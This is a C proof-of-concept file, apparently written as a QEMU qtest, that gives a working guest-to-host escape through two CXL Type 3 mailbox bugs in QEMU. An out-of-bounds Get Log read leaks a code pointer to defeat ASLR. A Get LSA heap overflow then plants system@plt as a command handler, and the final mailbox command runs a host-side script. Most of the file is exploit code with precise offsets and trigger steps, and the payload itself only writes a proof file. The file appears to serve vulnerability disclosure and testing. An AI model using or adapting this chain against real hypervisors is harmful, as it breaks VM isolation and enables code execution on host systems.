/*
 * CXL Type 3 Guest-to-Host Escape PoC
 *
 * Chains two CXL mailbox bugs to get arbitrary code execution on the
 * host from a guest VM, with full ASLR bypass. No /proc access needed.
 *
 * Bug 1 - Get Log OOB read (cxl-mailbox-utils.c, cmd_logs_get_log):
 *   Bounds check compares offset+length against sizeof(cel_log) in bytes,
 *   but cel_log+offset is pointer arithmetic scaled by sizeof(struct cel_log)=4.
 *   Lets us read ~1MB past cel_log. We read a handler pointer from the
 *   adjacent vdm CCI's command table to derive the PIE base.
 *
 * Bug 2 - Get LSA heap overflow (cxl-mailbox-utils.c, cmd_ccls_get_lsa):
 *   Guest-controlled length is not checked against the 2048-byte payload
 *   buffer. Requesting 2680 bytes overflows into cci->cxl_cmd_set[0][0],
 *   letting us install a fake handler (system@plt).
 *
 * Triggering command (set=0,cmd=0) calls system("/tmp/x") which executes
 * an attacker-controlled script on the host, writing proof to a file.
 *
 * Tested against QEMU v11.0.0-rc2, x86_64-softmmu, q35, ASLR on.
 *
 * Copyright (c) 2026, Licensed under GNU GPL v2 or later.
 */

#include "qemu/osdep.h"
#include <glib/gstdio.h>
#include "libqtest.h"

#define MMCFG_BASE  0xb0000000ULL

#define MBOX_CMD    0x08
#define MBOX_CTRL   0x04
#define MBOX_STS    0x10
#define MBOX_PL     0x20

#define CCLS        0x41
#define GET_LSA     0x02
#define SET_LSA     0x03
#define LOGS        0x04
#define GET_LOG     0x01

/* objdump -d/-t qemu-system-x86_64 (build-specific, update if binary changes) */
#define SYSTEM_PLT_OFFSET        0x348390
#define IDENTIFY_HANDLER_OFFSET  0x48d122

/*
 * Overflow geometry (offsets within CXLType3Dev, from GDB ptype /o):
 *   payload buffer = cxl_dstate + 1464 + 32 = offset 18856
 *   cci.cxl_cmd_set[0][0]                  = offset 21504
 *   delta = 2648 bytes; need 2680 to cover one 32-byte cxl_cmd entry.
 */
#define OVERFLOW_TO_CMD_TABLE  2648
#define EXPLOIT_GETLSA_LEN     2680

/*
 * OOB read geometry:
 *   cel_log[65536] is 262144 bytes. The check uses byte semantics but
 *   the memmove uses element pointer arithmetic (x4). offset=65588 gives
 *   byte position 262352, which is 208 bytes past cel_log -- right on
 *   vdm_fm_owned_ld_mctp_cci.cxl_cmd_set[0][1].handler.
 */
#define LEAK_LOG_OFFSET   65588
#define LEAK_LOG_LENGTH   8

#define EXPLOIT_SCRIPT   "/tmp/x"
#define PROOF_FILE       "/tmp/pwned-by-cxl-guest"

/* CEL UUID from CXL spec */
static const uint8_t cel_uuid[16] = {
    0x0d, 0xa9, 0xc0, 0xb5, 0xbf, 0x41, 0x4b, 0x78,
    0x8f, 0x79, 0x96, 0xb1, 0x62, 0x3b, 0x3f, 0x17
};

/* --- helpers --- */

static uint64_t mcfg(int bus, int dev, int fn, int reg)
{
    return MMCFG_BASE | ((uint64_t)bus << 20) | ((uint64_t)dev << 15)
                     | ((uint64_t)fn << 12) | (uint64_t)reg;
}

static void program_bridges_and_bar(QTestState *qts, uint32_t bar2_addr)
{
    /* Enable MMCFG on q35 */
    qtest_outl(qts, 0xcf8, 0x80000000 | 0x60);
    qtest_outl(qts, 0xcfc, 0xb0000001);

    /* Root port bus master/memory enable + secondary/subordinate bus */
    qtest_outl(qts, 0xcf8, 0x80000000 | (1u << 11) | 0x04);
    qtest_outw(qts, 0xcfc, 0x0007);
    qtest_outl(qts, 0xcf8, 0x80000000 | (1u << 11) | 0x18);
    qtest_outl(qts, 0xcfc, 0x00353400);
    qtest_outl(qts, 0xcf8, 0x80000000 | (1u << 11) | 0x20);
    qtest_outl(qts, 0xcfc, 0xfe6ffe60);

    /* pxb-cxl bridge */
    qtest_writel(qts, mcfg(0x34, 0, 0, 0x18), 0x00353534);
    qtest_writel(qts, mcfg(0x34, 0, 0, 0x20), 0xfe6ffe60);
    qtest_writew(qts, mcfg(0x34, 0, 0, 0x04), 0x0007);

    /* cxl-rp: BAR setup for device registers */
    qtest_writel(qts, mcfg(0x35, 0, 0, 0x18), bar2_addr | 0x4);
    qtest_writel(qts, mcfg(0x35, 0, 0, 0x1c), 0);
    qtest_writew(qts, mcfg(0x35, 0, 0, 0x04), 0x0006);
}

/* Scan 'info mtree -f' output for a memory region by name */
static uint64_t find_mr_in_mtree(const char *mtree, const char *name)
{
    const char *p = mtree;
    size_t namelen = strlen(name);
    while ((p = strstr(p, ": ")) != NULL) {
        const char *region = p + 2;
        if (strncmp(region, name, namelen) == 0) {
            char term = region[namelen];
            if (term == '\r' || term == '\n' || term == '\0' ||
                (term == ' ' && region[namelen + 1] == '@')) {
                const char *ls = p;
                while (ls > mtree && ls[-1] != '\n' && ls[-1] != '\r') {
                    ls--;
                }
                while (*ls == ' ' || *ls == '\t') {
                    ls++;
                }
                return (uint64_t)g_ascii_strtoull(ls, NULL, 16);
            }
        }
        p += 2;
    }
    return 0;
}

/* --- mailbox --- */

static uint64_t cxl_mbox_send(QTestState *qts, uint64_t mbox_gpa,
                               uint8_t set, uint8_t cmd,
                               const void *pl_in, size_t pl_len,
                               uint32_t *out_rc)
{
    uint64_t pl_addr = mbox_gpa + MBOX_PL;
    for (size_t i = 0; i < pl_len; i += 4) {
        uint32_t val = 0;
        memcpy(&val, (const uint8_t *)pl_in + i,
               (pl_len - i >= 4) ? 4 : pl_len - i);
        qtest_writel(qts, pl_addr + i, val);
    }

    uint64_t cmd_reg = (uint64_t)cmd | ((uint64_t)set << 8) |
                       ((uint64_t)pl_len << 16);
    qtest_writeq(qts, mbox_gpa + MBOX_CMD, cmd_reg);
    qtest_writel(qts, mbox_gpa + MBOX_CTRL, 0x1);

    uint64_t sts = qtest_readq(qts, mbox_gpa + MBOX_STS);
    uint64_t cmd_out = qtest_readq(qts, mbox_gpa + MBOX_CMD);
    if (out_rc) {
        *out_rc = (sts >> 32) & 0xFFFF;
    }
    return (cmd_out >> 16) & 0xFFFFF;
}

static void mbox_read_payload(QTestState *qts, uint64_t mbox_gpa,
                               void *buf, size_t len)
{
    uint8_t *dst = buf;
    for (size_t i = 0; i < len; i += 4) {
        uint32_t val = qtest_readl(qts, mbox_gpa + MBOX_PL + i);
        size_t chunk = (len - i >= 4) ? 4 : len - i;
        memcpy(dst + i, &val, chunk);
    }
}

static void set_lsa(QTestState *qts, uint64_t mbox_gpa,
                    uint32_t offset, const uint8_t *data, size_t len)
{
    g_assert(len + 8 <= 2048);
    uint8_t payload[2048];
    memset(payload, 0, sizeof(payload));
    memcpy(payload, &offset, 4);
    memcpy(payload + 8, data, len);

    uint32_t rc;
    cxl_mbox_send(qts, mbox_gpa, CCLS, SET_LSA, payload, 8 + len, &rc);
    g_assert_cmphex(rc, ==, 0x00);
}

/* --- phase 1: leak PIE base via Get Log OOB read --- */

static uint64_t leak_pie_base(QTestState *qts, uint64_t mbox_gpa)
{
    uint8_t get_log_pl[24];
    memset(get_log_pl, 0, sizeof(get_log_pl));
    memcpy(get_log_pl, cel_uuid, 16);
    uint32_t off = LEAK_LOG_OFFSET;
    uint32_t len = LEAK_LOG_LENGTH;
    memcpy(get_log_pl + 16, &off, 4);
    memcpy(get_log_pl + 20, &len, 4);

    uint32_t rc;
    cxl_mbox_send(qts, mbox_gpa, LOGS, GET_LOG,
                  get_log_pl, sizeof(get_log_pl), &rc);
    g_test_message("Get Log rc=%u", rc);
    g_assert_cmphex(rc, ==, 0x00);

    uint64_t handler = 0;
    mbox_read_payload(qts, mbox_gpa, &handler, 8);
    g_test_message("Leaked handler: 0x%" PRIx64, handler);
    g_assert_cmphex(handler, !=, 0);

    uint64_t base = handler - IDENTIFY_HANDLER_OFFSET;
    g_test_message("PIE base: 0x%" PRIx64, base);

    if (base & 0xFFF) {
        g_test_message("WARNING: base not page-aligned, may be wrong");
    }
    return base;
}

/* --- exploit --- */

static void create_exploit_script(void)
{
    FILE *f = fopen(EXPLOIT_SCRIPT, "w");
    g_assert(f);
    fprintf(f, "#!/bin/sh\n"
               "echo 'PWNED: Guest escaped to host via CXL mailbox overflow' > %s\n"
               "echo \"Ran as: $(whoami) PID=$$\" >> %s\n"
               "date >> %s\n", PROOF_FILE, PROOF_FILE, PROOF_FILE);
    fclose(f);
    chmod(EXPLOIT_SCRIPT, 0755);
}

static void test_cxl_escape(void)
{
    if (g_test_subprocess()) {
        unlink(PROOF_FILE);
        create_exploit_script();

        g_autofree char *lsa_path = NULL;
        int lsa_fd = g_file_open_tmp("qtest-escape-XXXXXX", &lsa_path, NULL);
        g_assert(lsa_fd >= 0);
        uint8_t *zeros = g_malloc0(1024 * 1024);
        g_assert(write(lsa_fd, zeros, 1024 * 1024) == 1024 * 1024);
        g_free(zeros);
        close(lsa_fd);

        QTestState *qts = qtest_initf(
            "-machine q35,cxl=on -m 2G "
            "-object memory-backend-file,id=cxl-lsa,mem-path=%s,size=1M "
            "-object memory-backend-ram,id=cxl-mem,size=256M "
            "-device pxb-cxl,bus_nr=0x34,bus=pcie.0,id=cxl.0 "
            "-M cxl-fmw.0.targets.0=cxl.0,cxl-fmw.0.size=4G "
            "-device cxl-rp,bus=cxl.0,id=cxl-rp0,chassis=0,slot=0 "
            "-device cxl-type3,bus=cxl-rp0,persistent-memdev=cxl-mem,"
            "lsa=cxl-lsa,id=cxl-pmem0",
            lsa_path);

        program_bridges_and_bar(qts, 0xfe610000);

        g_autofree char *mtree = qtest_hmp(qts, "info mtree -f");
        uint64_t mbox_gpa = find_mr_in_mtree(mtree, "mailbox");
        g_assert_cmpuint(mbox_gpa, !=, 0);
        g_test_message("mbox @ 0x%" PRIx64, mbox_gpa);

        /* phase 1: leak PIE base via OOB read */
        uint64_t pie_base = leak_pie_base(qts, mbox_gpa);
        g_assert_cmphex(pie_base, !=, 0);
        uint64_t system_addr = pie_base + SYSTEM_PLT_OFFSET;
        g_test_message("system@plt: 0x%" PRIx64, system_addr);

        /* phase 2: plant fake cxl_cmd in LSA */
        uint8_t entry[32] = {0};
        memcpy(entry, EXPLOIT_SCRIPT "\0", 7);       /* name = "/tmp/x" */
        memcpy(entry + 8, &system_addr, 8);           /* handler = system@plt */
        memset(entry + 16, 0xFF, 8);                  /* in = accept any */

        set_lsa(qts, mbox_gpa, OVERFLOW_TO_CMD_TABLE, entry, 32);

        /* phase 3: overflow payload buffer into cxl_cmd_set[0][0] */
        struct {
            uint32_t offset;
            uint32_t length;
        } QEMU_PACKED get_lsa_in = { .offset = 0, .length = EXPLOIT_GETLSA_LEN };

        uint32_t rc;
        cxl_mbox_send(qts, mbox_gpa, CCLS, GET_LSA,
                      &get_lsa_in, sizeof(get_lsa_in), &rc);
        g_assert_cmphex(rc, ==, 0x00);
        g_test_message("overflow done, handler installed");

        /* phase 4: trigger system("/tmp/x") */
        cxl_mbox_send(qts, mbox_gpa, 0x00, 0x00, NULL, 0, &rc);

        if (access(PROOF_FILE, F_OK) == 0) {
            g_test_message("EXPLOIT SUCCEEDED: %s created", PROOF_FILE);
        } else {
            g_test_message("exploit failed");
        }

        qtest_quit(qts);
        unlink(lsa_path);
        return;
    }

    g_test_trap_subprocess(NULL, 60 * G_USEC_PER_SEC,
                           G_TEST_SUBPROCESS_INHERIT_STDERR);

    if (access(PROOF_FILE, F_OK) == 0) {
        char buf[256] = {0};
        FILE *f = fopen(PROOF_FILE, "r");
        if (f) {
            size_t n = fread(buf, 1, sizeof(buf) - 1, f);
            buf[n] = '\0';
            fclose(f);
        }
        g_test_message("GUEST-TO-HOST ESCAPE CONFIRMED");
        g_test_message("proof: %s", buf);
    }
}

int main(int argc, char **argv)
{
    g_test_init(&argc, &argv, NULL);
    qtest_add_func("/x86_64/cxl/escape", test_cxl_escape);
    return g_test_run();
}
